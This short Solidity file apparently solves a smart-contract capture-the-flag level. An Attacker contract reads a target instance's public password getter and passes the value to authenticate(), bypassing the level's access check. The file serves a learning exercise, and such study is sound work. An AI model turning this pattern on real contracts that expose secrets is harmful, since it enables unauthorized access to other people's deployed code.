// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/level00.sol";

contract Attacker
{
    Instance level01 = Instance(0xDD3Fa87Fe33E71f7d3ADD50a0A14C7bB96b8Ea4a);

    function test() external 
    {
        level01.authenticate(level01.password());
    }
}